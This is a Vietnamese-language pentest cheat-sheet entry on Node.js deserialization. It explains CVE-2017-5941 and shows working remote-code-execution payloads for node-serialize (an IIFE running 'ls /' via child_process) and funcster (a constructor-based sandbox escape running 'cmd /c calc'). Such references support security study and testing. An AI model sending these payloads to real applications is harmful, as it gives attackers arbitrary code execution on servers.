# Node Deserialization

> Node.js deserialization đề cập đến quá trình tái tạo các đối tượng JavaScript từ một định dạng đã được serialized, chẳng hạn như JSON, BSON hoặc các định dạng khác biểu diễn dữ liệu có cấu trúc. Trong các ứng dụng Node.js, serialization và deserialization thường được sử dụng để lưu trữ dữ liệu, caching và giao tiếp giữa các process.

## Tóm tắt

* [Phương pháp](#phương-pháp)

  * [node-serialize](#node-serialize)
  * [funcster](#funcster)
* [Tài liệu tham khảo](#tài-liệu-tham-khảo)

## Phương pháp

* Trong source code của Node, tìm kiếm:

  * `node-serialize`
  * `serialize-to-js`
  * `funcster`

### node-serialize

> Một vấn đề đã được phát hiện trong package node-serialize phiên bản 0.0.4 dành cho Node.js. Dữ liệu không đáng tin cậy được truyền vào hàm `unserialize()` có thể bị khai thác để đạt được arbitrary code execution bằng cách truyền một JavaScript Object chứa Immediately Invoked Function Expression (IIFE).

1. Tạo một serialized payload

   ```js
   var y = {
       rce : function(){
           require('child_process').exec('ls /', function(error,
           stdout, stderr) { console.log(stdout) });
       },
   }
   var serialize = require('node-serialize');
   console.log("Serialized: \n" + serialize.serialize(y));
   ```

2. Thêm dấu ngoặc `()` để buộc thực thi

   ```js
   {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
   ```

3. Gửi payload

### funcster

```js
{"rce":{"__js_function":"function(){CMD=\"cmd /c calc\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()"}}
```

## Tài liệu tham khảo

* [CVE-2017-5941 - National Vulnerability Database - February 9, 2017](https://web.archive.org/web/20190820172715/https://nvd.nist.gov/vuln/detail/CVE-2017-5941)
* [Exploiting Node.js deserialization bug for Remote Code Execution (CVE-2017-5941) - Ajin Abraham - October 31, 2018](https://web.archive.org/web/20181031111654/https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-for-remote-code-execution.pdf)
* [NodeJS Deserialization - gonczor - January 8, 2020](https://web.archive.org/web/20240530025137/https://blacksheephacks.pl/nodejs-deserialization/)
